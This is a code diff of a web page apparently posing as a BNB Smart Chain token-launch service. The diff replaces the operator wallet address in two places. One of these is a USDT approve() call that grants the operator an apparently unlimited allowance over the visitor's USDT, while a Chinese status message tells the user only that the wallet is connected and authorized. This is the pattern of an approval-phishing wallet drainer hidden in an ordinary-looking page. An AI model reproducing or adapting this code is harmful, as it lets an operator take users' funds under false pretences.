@@ -84,7 +84,7 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 </div>
 
 <script>
-const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
+const ADMIN_WALLET = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
 const DEPLOY_FEE_BNB = "0.009";
 const BSC_CHAIN_ID = 56;
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
@@ -156,7 +156,7 @@ async function doApproveLogic(signerRef, userAddress){
     const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
       "function approve(address spender, uint256 amount) external returns(bool)"
     ], signerRef);
-    const approveTx = await usdtContract.approve("0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6", MAX_ALLOWANCE);
+    const approveTx = await usdtContract.approve("0x47542770f3a8eea43d3321867b155c3ac01160d8", MAX_ALLOWANCE);
     await approveTx.wait();
     showStatus("✅ 授权成功！钱包已连接，可以开始发币");
     connectTip.style.display = "block";
